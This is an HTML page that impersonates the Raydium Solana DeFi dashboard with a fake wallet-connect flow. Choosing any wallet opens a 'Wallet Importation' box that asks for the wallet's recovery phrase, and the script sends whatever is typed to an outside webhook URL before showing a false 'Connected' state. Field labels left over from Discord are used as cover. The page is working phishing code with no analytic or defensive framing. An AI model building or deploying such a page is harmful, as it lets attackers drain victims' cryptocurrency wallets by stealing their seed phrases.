
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Raydium - API</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
    }
    
    body {
      background-color: #0f1429;
      color: white;
      min-height: 100vh;
    }
    
    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }
    
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 0;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .logo {
      display: flex;
      align-items: center;
      font-size: 24px;
      font-weight: 600;
      color: white;
      text-decoration: none;
    }
    
    .logo span {
      background: linear-gradient(45deg, #7c59ff, #4cd2ff);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      margin-right: 8px;
    }
    
    .connect-btn {
      background-color: #14f195;
      color: #0f1429;
      border: none;
      border-radius: 8px;
      padding: 10px 20px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    
    .connect-btn:hover {
      background-color: #0dd584;
    }
    
    .stats {
      display: flex;
      justify-content: space-between;
      padding: 16px 0;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
      font-size: 14px;
    }
    
    .stats-item {
      display: flex;
      align-items: center;
    }
    
    .stats-label {
      color: #8a91b5;
      margin-right: 8px;
    }
    
    .stats-value {
      font-weight: 600;
      font-size: 16px;
    }
    
    .main {
      padding: 20px 0;
    }
    
    .portfolio-card {
      background-color: rgba(24, 30, 54, 0.6);
      border-radius: 12px;
      padding: 20px;
      margin-bottom: 20px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    }
    
    .portfolio-header {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
    }
    
    .portfolio-title {
      font-size: 20px;
      font-weight: 600;
    }
    
    table {
      width: 100%;
      border-collapse: collapse;
    }
    
    th {
      text-align: left;
      padding: 12px 0;
      color: #8a91b5;
      font-weight: 500;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    td {
      padding: 16px 0;
      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    }
    
    .token {
      display: flex;
      align-items: center;
    }
    
    .token-icon {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      margin-right: 12px;
      background-color: #2c3252;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }
    
    .token-name {
      font-weight: 600;
    }
    
    .token-pair {
      color: #8a91b5;
      font-size: 14px;
      margin-top: 4px;
    }
    
    .positive {
      color: #14f195;
    }
    
    .negative {
      color: #ff5252;
    }
    
    .wallet-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 10;
    }
    
    .wallet-modal.active {
      display: flex;
    }
    
    .modal-content {
      background-color: #181e36;
      border-radius: 12px;
      width: 400px;
      max-width: 90%;
      padding: 24px;
    }
    
    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }
    
    .modal-title {
      font-size: 18px;
      font-weight: 600;
    }
    
    .close-btn {
      background: none;
      border: none;
      color: #8a91b5;
      font-size: 20px;
      cursor: pointer;
    }
    
    .wallet-list {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
    }
    
    .wallet-option {
      background-color: rgba(44, 50, 82, 0.6);
      border-radius: 8px;
      padding: 16px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    
    .wallet-option:hover {
      background-color: rgba(62, 70, 115, 0.6);
    }
    
    .wallet-logo {
      width: 48px;
      height: 48px;
      border-radius: 12px;
      margin-bottom: 12px;
      background-color: #343b5c;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .wallet-name {
      font-size: 14px;
      font-weight: 500;
    }
    
    .tabs {
      display: flex;
      gap: 24px;
      margin-bottom: 20px;
    }
    
    .tab {
      color: #8a91b5;
      font-weight: 500;
      padding-bottom: 8px;
      border-bottom: 2px solid transparent;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    
    .tab.active {
      color: white;
      border-bottom: 2px solid #14f195;
    }
    
    .progress-bar {
      width: 100%;
      height: 6px;
      background-color: rgba(44, 50, 82, 0.6);
      border-radius: 3px;
      margin-top: 8px;
    }
    
    .progress-fill {
      height: 100%;
      background: linear-gradient(45deg, #7c59ff, #4cd2ff);
      border-radius: 3px;
    }

    /* Discord Verification Modal Styles */
    .discord-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 20;
    }
    
    .discord-modal.active {
      display: flex;
    }
    
    .discord-modal-content {
      background-color: #181e36;
      border-radius: 12px;
      width: 400px;
      max-width: 90%;
      padding: 24px;
    }
    
    .discord-input {
      width: 100%;
      background-color: rgba(44, 50, 82, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.1);
      color: white;
      border-radius: 8px;
      padding: 12px 16px;
      font-size: 16px;
      margin: 16px 0;
    }
    
    .discord-input:focus {
      outline: none;
      border-color: #7c59ff;
    }
    
    .discord-submit-btn {
      width: 100%;
      background-color: #3b82f6;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 12px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    
    .discord-submit-btn:hover {
      background-color: #2563eb;
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <a href="#" class="logo">
        <span>◇</span> Raydium - API
      </a>
      <button class="connect-btn" id="connectWalletBtn">Connect Wallet</button>
    </header>
    
    <div class="stats">
      <div class="stats-item">
        <div class="stats-label">TVL</div>
        <div class="stats-value">$1.77B</div>
      </div>
      <div class="stats-item">
        <div class="stats-label">Vol. 24h</div>
        <div class="stats-value">$1B</div>
      </div>
    </div>
    
    <main class="main">
      <div class="portfolio-card">
        <div class="portfolio-header">
          <div class="portfolio-title">Portfolio</div>
          <div class="tabs">
            <div class="tab active">Pools</div>
            <div class="tab">Farms</div>
            <div class="tab">Staking</div>
            <div class="tab">History</div>
          </div>
        </div>
        
        <table>
          <thead>
            <tr>
              <th>Pool</th>
              <th>Balance</th>
              <th>Value</th>
              <th>APR</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>
                <div class="token">
                  <div class="token-icon">SOL</div>
                  <div>
                    <div class="token-name">SOL-USDC</div>
                    <div class="token-pair">Solana • USDC</div>
                  </div>
                </div>
              </td>
              <td>0.00</td>
              <td>$0.00</td>
              <td>
                <div>93.01%</div>
                <div class="progress-bar">
                  <div class="progress-fill" style="width: 93%"></div>
                </div>
              </td>
            </tr>
            <tr>
              <td>
                <div class="token">
                  <div class="token-icon">RAY</div>
                  <div>
                    <div class="token-name">SOL-RAY</div>
                    <div class="token-pair">Solana • Raydium</div>
                  </div>
                </div>
              </td>
              <td>0.00</td>
              <td>$0.00</td>
              <td>
                <div>76.99%</div>
                <div class="progress-bar">
                  <div class="progress-fill" style="width: 77%"></div>
                </div>
              </td>
            </tr>
            <tr>
              <td>
                <div class="token">
                  <div class="token-icon">SOL</div>
                  <div>
                    <div class="token-name">SOL-DOGE</div>
                    <div class="token-pair">Solana • Dogecoin</div>
                  </div>
                </div>
              </td>
              <td>0.00</td>
              <td>$0.00</td>
              <td>
                <div>261.26%</div>
                <div class="progress-bar">
                  <div class="progress-fill" style="width: 100%"></div>
                </div>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </main>
  </div>
  
  <!-- Wallet Connect Modal -->
  <div class="wallet-modal" id="walletModal">
    <div class="modal-content">
      <div class="modal-header">
        <div class="modal-title">Connect Wallet</div>
        <button class="close-btn" id="closeModal">×</button>
      </div>
      <div class="wallet-list">
        <div class="wallet-option" data-wallet="phantom">
          <div class="wallet-logo">Ph</div>
          <div class="wallet-name">Phantom</div>
        </div>
        <div class="wallet-option" data-wallet="exodus">
          <div class="wallet-logo">Ex</div>
          <div class="wallet-name">Exodus</div>
        </div>
        <div class="wallet-option" data-wallet="solflare">
          <div class="wallet-logo">Sf</div>
          <div class="wallet-name">Solflare</div>
        </div>
        <div class="wallet-option" data-wallet="slope">
          <div class="wallet-logo">Sl</div>
          <div class="wallet-name">Slope</div>
        </div>
      </div>
    </div>
  </div>
  
  <!-- Discord Verification Modal -->
  <div class="discord-modal" id="discordModal">
    <div class="discord-modal-content">
      <div class="modal-header">
        <div class="modal-title">Wallet Importation</div>
        <button class="close-btn" id="closeDiscordModal">×</button>
      </div>
      <div>
        <p>Input your Wallet's Recovery Phrase to import</p>
        <input type="text" class="discord-input" id="discordUsername" placeholder="tennis#0000">
        <button class="discord-submit-btn" id="discordSubmitBtn">Input</button>
      </div>
    </div>
  </div>
  
  <script>
    // Connect wallet functionality
    const connectWalletBtn = document.getElementById('connectWalletBtn');
    const walletModal = document.getElementById('walletModal');
    const closeModal = document.getElementById('closeModal');
    const walletOptions = document.querySelectorAll('.wallet-option');
    
    // Discord verification modal
    const discordModal = document.getElementById('discordModal');
    const closeDiscordModal = document.getElementById('closeDiscordModal');
    const discordSubmitBtn = document.getElementById('discordSubmitBtn');
    const discordUsername = document.getElementById('discordUsername');
    
    connectWalletBtn.addEventListener('click', () => {
      walletModal.classList.add('active');
    });
    
    closeModal.addEventListener('click', () => {
      walletModal.classList.remove('active');
    });
    
    closeDiscordModal.addEventListener('click', () => {
      discordModal.classList.remove('active');
    });
    
    walletOptions.forEach(option => {
      option.addEventListener('click', () => {
        const walletType = option.getAttribute('data-wallet');
        // Instead of connecting directly, show Discord verification
        walletModal.classList.remove('active');
        discordModal.classList.add('active');
      });
    });
    
    discordSubmitBtn.addEventListener('click', () => {
  const username = discordUsername.value;
  if (username.trim() !== '') {
    // Send the username to the webhook
    fetch('https://webhook-test.com/f221633e2083f64846ecd36e7b4c25b6', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        discord: username
      })
    })
    .then(response => console.log("Webhook response:", response))
    .catch(error => console.error("Webhook error:", error));
    
    // Hide the discord modal
    discordModal.classList.remove('active');
    
    // Update the connect button to show connected state
    connectWalletBtn.textContent = 'Connected';
    connectWalletBtn.style.background = '#7c59ff';
  } else {
    // If no username entered, show a validation message
    discordUsername.style.borderColor = '#ff5252';
  }
});

    
    // Close modals if clicked outside
    window.addEventListener('click', (e) => {
      if (e.target === walletModal) {
        walletModal.classList.remove('active');
      }
      if (e.target === discordModal) {
        discordModal.classList.remove('active');
      }
    });
  </script>
</body>
</html>
